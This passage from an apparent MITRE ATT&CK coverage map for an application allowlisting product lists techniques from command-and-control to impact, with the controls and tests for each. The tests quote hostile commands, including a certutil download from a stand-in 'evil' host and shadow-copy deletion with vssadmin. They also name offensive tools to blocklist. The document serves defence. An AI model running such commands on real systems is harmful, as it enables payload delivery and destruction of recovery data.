**Limitations:** In-browser techniques not caught.

### T1213 - Data from Information Repositories
**No** ⚪ | none

Data from information repositories. Reading data from wikis/SharePoint. Data/network operation.

### T1213.002 - Sharepoint
**No** ⚪ | none

SharePoint. Network/API access.

### T1213.006 - Databases
**No** ⚪ | none

Databases. Network/API access.

### T1557 - Adversary-in-the-Middle
**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes

AitM tools (Responder, Inveigh, ettercap, bettercap) must be trusted. Blocked by default-deny. Inveigh as PS script: restricted by script control + PS blocklist for non-admins.

**Test:** 1) Responder.exe -> blocked (untrusted). 2) Inveigh.ps1 -> blocked by script control. 3) Blocklist PS for non-admins -> prevents Inveigh via PS.

### T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes

LLMNR/NBT-NS poisoning tools blocked by default-deny. Inveigh restricted by script control + PS blocklist.

**Test:** Responder -> blocked. Inveigh.ps1 -> script control. Blocklist PS for non-admins.

### T1557.002 - ARP Cache Poisoning
**Yes** 🟢 | default-deny | Testable: yes

ARP spoofing tools (arpspoof, ettercap, bettercap) must be trusted. Blocked by default-deny.

**Test:** ARP spoofing tool not allowlisted -> blocked.

**Limitations:** No built-in Windows ARP spoofing capability.

### T1557.003 - DHCP Spoofing
**No** ⚪ | none

DHCP spoofing. Network-level.

### T1560 - Archive Collected Data
**No** ⚪ | default-deny (tool) | Testable: partial

Archive collected data (parent). Using archive tools. 7z/rar/zip tools must be trusted.

**Test:** Untrusted archiver -> blocked. Built-in tar/Compress-Archive trusted.

### T1560.001 - Archive via Utility
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone archiving tools (7z, WinRAR, rar) blocked by default-deny. Built-in tar.exe restrictable via blocklist. PowerShell Compress-Archive available if PS trusted.

**Test:** 1) 7z.exe not allowlisted -> blocked. 2) Blocklist tar.exe for non-admins.

**Limitations:** PowerShell Compress-Archive available if PS not blocklisted for user.

### T1560.002 - Archive via Library
**No** ⚪ | none

Archive via library. Using .NET/Python libraries from trusted process. In-process.

### T1560.003 - Archive via Custom Method
**No** ⚪ | none

Archive via custom method. Custom code in trusted process.


## COMMAND-AND-CONTROL (45 techniques - 6 covered)

### T1001 - Data Obfuscation
**No** ⚪ | none

Data obfuscation. Network-level C2 technique. No file execution.

### T1001.001 - Junk Data
**No** ⚪ | none

Junk data. Network.

### T1001.002 - Steganography
**No** ⚪ | none

Steganography. Network.

### T1001.003 - Protocol or Service Impersonation
**No** ⚪ | none

Protocol impersonation. Network.

### T1008 - Fallback Channels
**No** ⚪ | none

Fallback channels. Network.

### T1071 - Application Layer Protocol
**No** ⚪ | none

Application layer protocol. Network.

### T1071.001 - Web Protocols
**No** ⚪ | none

Web protocols. Network.

### T1071.002 - File Transfer Protocols
**No** ⚪ | none

File transfer protocols. Network.

### T1071.003 - Mail Protocols
**No** ⚪ | none

Mail protocols. Network.

### T1071.004 - DNS
**No** ⚪ | none

DNS. Network.

### T1071.005 - Publish/Subscribe Protocols
**No** ⚪ | none

Publish/subscribe protocols. Network.

### T1090 - Proxy
**No** ⚪ | none

Proxy. Network infrastructure.

### T1090.001 - Internal Proxy
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Internal proxy tools (chisel, socat, netsh portproxy) - standalone tools blocked. netsh restrictable via blocklist metarule.

**Test:** 1) chisel/socat -> blocked (untrusted). 2) Blocklist netsh for non-admins.

**Limitations:** netsh portproxy is the built-in risk. Blocklist addresses it.

### T1090.002 - External Proxy
**No** ⚪ | none

External proxy. Network.

### T1090.003 - Multi-hop Proxy
**No** ⚪ | none

Multi-hop proxy. Network.

### T1090.004 - Domain Fronting
**No** ⚪ | none

Domain fronting. Network.

### T1092 - Communication Through Removable Media
**No** ⚪ | none

Communication through removable media. Data on USB for C2. No execution required.

**Limitations:** If C2 agent on USB is untrusted, blocked.

### T1095 - Non-Application Layer Protocol
**No** ⚪ | none

Non-application layer protocol. Network.

### T1102 - Web Service
**No** ⚪ | none

Web service. Network.

### T1102.001 - Dead Drop Resolver
**No** ⚪ | none

Dead drop resolver. Network.

### T1102.002 - Bidirectional Communication
**No** ⚪ | none

Bidirectional communication. Network.

### T1102.003 - One-Way Communication
**No** ⚪ | none

One-way communication. Network.

### T1104 - Multi-Stage Channels
**No** ⚪ | none

Multi-stage channels. Network.

**Limitations:** If staged payload is file, must be trusted.

### T1105 - Ingress Tool Transfer
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Ingress tool transfer - downloaded tools must be trusted to execute. Download succeeds but execution blocked. Download utilities (certutil, bitsadmin, curl) can be blocklisted.

**Test:** 1) certutil -urlcache -split -f http://evil/tool.exe C:\Temp\t.exe -> downloads, execution blocked. 2) Blocklist certutil/bitsadmin for non-admins.

**Limitations:** Download not prevented. Execution is the control point.

### T1132 - Data Encoding
**No** ⚪ | none

Data encoding. Network-level.

### T1132.001 - Standard Encoding
**No** ⚪ | none

Standard encoding. Network.

### T1132.002 - Non-Standard Encoding
**No** ⚪ | none

Non-standard encoding. Network.

### T1205 - Traffic Signaling
**No** ⚪ | none

Traffic signaling / port knocking. Network-level. No file execution.

**Limitations:** Network security.

### T1205.001 - Port Knocking
**No** ⚪ | none

Port knocking. Network-level.

### T1205.002 - Socket Filters
**No** ⚪ | none

Socket filters. Kernel-level network manipulation.

### T1219 - Remote Access Tools
**Yes** 🟢 | default-deny | Testable: yes

Remote access tools (Cobalt Strike, AnyDesk, TeamViewer, etc) must be allowlisted. Unauthorized RATs blocked.

**Test:** 1) Cobalt Strike beacon -> blocked. 2) AnyDesk not allowlisted -> blocked.

**Limitations:** RATs signed by trusted publisher may pass publisher trust. Blocklist specific unwanted RATs.

### T1219.001 - IDE Tunneling
**Yes** 🟢 | default-deny | Testable: yes

IDE tunneling. IDE tools (VS Code Remote) must be allowlisted.

**Test:** VS Code Remote tunnel binary not allowlisted -> blocked.

**Limitations:** If IDE legitimately trusted, tunnel works.

### T1219.002 - Remote Desktop Software
**Yes** 🟢 | default-deny | Testable: yes

Remote desktop software. RMM tools must be allowlisted.

**Test:** Unauthorized RMM tool exe -> blocked.

**Limitations:** Legitimately deployed RMM tools are trusted.

### T1219.003 - Remote Access Hardware
**No** ⚪ | none

Remote access hardware. Physical devices. Not software.

### T1568 - Dynamic Resolution
**No** ⚪ | none

Dynamic resolution. DNS-based. Network.

### T1568.001 - Fast Flux DNS
**No** ⚪ | none

Fast flux DNS. Network.

### T1568.002 - Domain Generation Algorithms
**No** ⚪ | none

DGA. Network/in-process.

### T1568.003 - DNS Calculation
**No** ⚪ | none

DNS calculation. Network.

### T1571 - Non-Standard Port
**No** ⚪ | none

Non-standard port. Network.

### T1572 - Protocol Tunneling
**Yes** 🟢 | default-deny | Testable: yes

Tunneling tools (chisel, plink, ngrok, cloudflared) must be trusted to execute. Blocked by default-deny.

**Test:** chisel.exe, plink.exe, ngrok.exe not allowlisted -> blocked.

**Limitations:** Built-in SSH tunneling (ssh.exe) on modern Windows available if not blocklisted.

### T1573 - Encrypted Channel
**No** ⚪ | none

Encrypted channel. Network.

### T1573.001 - Symmetric Cryptography
**No** ⚪ | none

Symmetric crypto. Network.

### T1573.002 - Asymmetric Cryptography
**No** ⚪ | none

Asymmetric crypto. Network.

### T1659 - Content Injection
**No** ⚪ | none

Content injection. Injecting content into network traffic. Network-level.

**Limitations:** If injected content leads to file download+execution, execution blocked.

### T1665 - Hide Infrastructure
**No** ⚪ | none

Hide infrastructure. Network/attacker infra.


## EXFILTRATION (17 techniques - 0 covered)

### T1011 - Exfiltration Over Other Network Medium
**No** ⚪ | none

Exfiltration over other network medium. Network-level data transfer.

**Limitations:** If exfil tool untrusted, blocked.

### T1011.001 - Exfiltration Over Bluetooth
**No** ⚪ | none

Exfiltration over Bluetooth. Network/hardware.

### T1020 - Automated Exfiltration
**No** ⚪ | script-control (tool) | Testable: partial

Automated exfiltration. Scripted data transfer. Script must be trusted.

**Test:** Untrusted exfil script -> blocked.

**Limitations:** Trusted PS scripts doing data transfer succeed.

### T1029 - Scheduled Transfer
**No** ⚪ | none

Scheduled transfer. Same principle.

### T1030 - Data Transfer Size Limits
**No** ⚪ | none

Data transfer size limits. Network-level evasion.

### T1041 - Exfiltration Over C2 Channel
**No** ⚪ | none

Exfiltration over C2 channel. Network. In-process by C2 implant.

**Limitations:** If C2 implant is untrusted, blocked. Network-level exfil not caught.

### T1048 - Exfiltration Over Alternative Protocol
**No** ⚪ | none

Exfiltration over alternative protocol. Network.

### T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol
**No** ⚪ | none

Symmetric encrypted non-C2. Network.

### T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
**No** ⚪ | none

Asymmetric encrypted non-C2. Network.

### T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
**No** ⚪ | none

Unencrypted non-C2. Network.

### T1052 - Exfiltration Over Physical Medium
**No** ⚪ | none

Exfiltration over physical medium. USB/physical.

### T1052.001 - Exfiltration over USB
**No** ⚪ | none

Exfiltration over USB. Physical.

### T1567 - Exfiltration Over Web Service
**No** ⚪ | none

Exfiltration over web service. Network.

**Limitations:** If exfil tool untrusted, blocked.

### T1567.001 - Exfiltration to Code Repository
**No** ⚪ | none

Exfiltration to code repository. Network.

### T1567.002 - Exfiltration to Cloud Storage
**No** ⚪ | none

Exfiltration to cloud storage. Network.

### T1567.003 - Exfiltration to Text Storage Sites
**No** ⚪ | none

Exfiltration to text storage. Network.

### T1567.004 - Exfiltration Over Webhook
**No** ⚪ | none

Exfiltration over webhook. Network.


## IMPACT (30 techniques - 9 covered)

### T1485 - Data Destruction
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Custom wiper tools blocked by default-deny. Built-in destruction tools (format.com, cipher.exe) restrictable via blocklist metarule.

**Test:** 1) Custom wiper -> blocked. 2) Blocklist format.com for non-admins. 3) Blocklist cipher.exe for non-admins.

**Limitations:** del command runs inside trusted cmd.exe - hard to blocklist del specifically without blocking cmd. Blocklist cmd.exe for non-admins for maximum restriction.

### T1486 - Data Encrypted for Impact
**Yes** 🟢 | default-deny | Testable: yes

Data encrypted for impact (ransomware). Ransomware executable must be trusted. This is Airlock's marquee use case.

**Test:** Ransomware exe dropped via any method -> blocked. Ransomware DLL -> blocked. Ransomware script -> blocked.

**Limitations:** Ransomware running inside already-trusted process (e.g., after injection) not caught.

### T1489 - Service Stop
**Yes** 🟢 | agent-tamper-protection + default-deny | Testable: yes

Airlock agent specifically protected by kernel driver against stop attempts. For other services: sc.exe and net.exe are core Windows utilities that cannot be practically blocklisted. Standalone service manipulation tools blocked by default-deny.

**Test:** 1) net stop airlock / sc stop airlock -> kernel driver prevents. 2) Standalone service manipulation tool -> blocked (untrusted).

**Limitations:** sc.exe and net.exe cannot be practically blocklisted. Other services can be stopped with built-in tools. Airlock agent itself is protected regardless.

### T1490 - Inhibit System Recovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

vssadmin.exe and bcdedit.exe: restrict via blocklist metarule for non-admins. Prevents shadow copy deletion and boot config modification - key ransomware precursors.

**Test:** 1) Blocklist vssadmin.exe for non-admins -> prevents 'vssadmin delete shadows'. 2) Blocklist bcdedit.exe for non-admins -> prevents boot config tampering. 3) Blocklist wbadmin.exe for non-admins -> prevents backup deletion.

**Limitations:** Admin-exempted users can still use these. PowerShell WMI shadow copy deletion possible if PS trusted.

### T1491 - Defacement
**No** ⚪ | none

Defacement. Modifying content. Data operation.

### T1491.001 - Internal Defacement
**No** ⚪ | none

Internal defacement. Data modification.

### T1491.002 - External Defacement
**No** ⚪ | none

External defacement. Server-side.

### T1495 - Firmware Corruption
**No** ⚪ | none

Firmware corruption. Below OS. Hardware/firmware level.

**Limitations:** If firmware update tool is untrusted, blocked.

### T1496 - Resource Hijacking
**No** ⚪ | default-deny | Testable: partial

Resource hijacking (parent). Cryptominer must be trusted.

**Test:** Cryptominer exe -> blocked.

**Limitations:** Miner in trusted process (JS in browser) not caught.

### T1496.001 - Compute Hijacking
**Yes** 🟢 | default-deny | Testable: yes

Cryptominer executables must be trusted. xmrig and similar tools blocked by default-deny.

**Test:** xmrig.exe not allowlisted -> blocked.

**Limitations:** Browser-based miners (JS in page) not caught - runs inside trusted browser process.

### T1496.002 - Bandwidth Hijacking
**No** ⚪ | none

Bandwidth hijacking. Network-level.

### T1498 - Network Denial of Service
**No** ⚪ | none

Network DoS. Network-level.

### T1498.001 - Direct Network Flood
**No** ⚪ | none

Direct network flood. Network.

### T1498.002 - Reflection Amplification
**No** ⚪ | none

Reflection amplification. Network.

### T1499 - Endpoint Denial of Service
**No** ⚪ | none

Endpoint DoS. Resource exhaustion. Behavioral.

**Limitations:** DoS tool must be trusted.

### T1499.001 - OS Exhaustion Flood
**No** ⚪ | none

OS exhaustion flood. Network/resource.

### T1499.002 - Service Exhaustion Flood
**No** ⚪ | none

Service exhaustion flood. Network.

### T1499.003 - Application Exhaustion Flood
**No** ⚪ | none

Application exhaustion flood. Network.

### T1499.004 - Application or System Exploitation
**No** ⚪ | none

Application/system exploitation. Exploit. In-memory.

### T1529 - System Shutdown/Reboot
**Yes** 🟢 | blocklist-metarule | Testable: yes

shutdown.exe restrictable via blocklist metarule.

**Test:** Blocklist shutdown.exe for non-admins.

**Limitations:** Forced reboot via other methods (API calls from trusted process) not caught.

### T1531 - Account Access Removal
**No** ⚪ | none

Account access removal. Identity operation.

### T1561 - Disk Wipe
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Wiper tools blocked by default-deny. format.com restrictable via blocklist metarule.

**Test:** 1) Custom wiper -> blocked. 2) Blocklist format.com for non-admins.

**Limitations:** Direct disk access APIs from trusted process not caught. Blocklist limits tool availability.

### T1561.001 - Disk Content Wipe
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Disk content wipe tools blocked. Restrictable via blocklist.

**Test:** Custom wiper -> blocked. Blocklist format.com.

### T1561.002 - Disk Structure Wipe
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

MBR/disk structure wipe tools blocked by default-deny.

**Test:** Standalone MBR wiper -> blocked.

**Limitations:** Direct disk access from trusted process not caught.

### T1565 - Data Manipulation
**No** ⚪ | none

Data manipulation. Modifying data. Data operation from trusted process.

### T1565.001 - Stored Data Manipulation
**No** ⚪ | none

Stored data manipulation. Data operation.

### T1565.002 - Transmitted Data Manipulation
**No** ⚪ | none

Transmitted data manipulation. Network.

### T1565.003 - Runtime Data Manipulation
**No** ⚪ | none

Runtime data manipulation. In-process.

### T1657 - Financial Theft
**No** ⚪ | none

Financial theft. Business logic/identity.

### T1667 - Email Bombing
**No** ⚪ | none

Email bombing. Email-level.
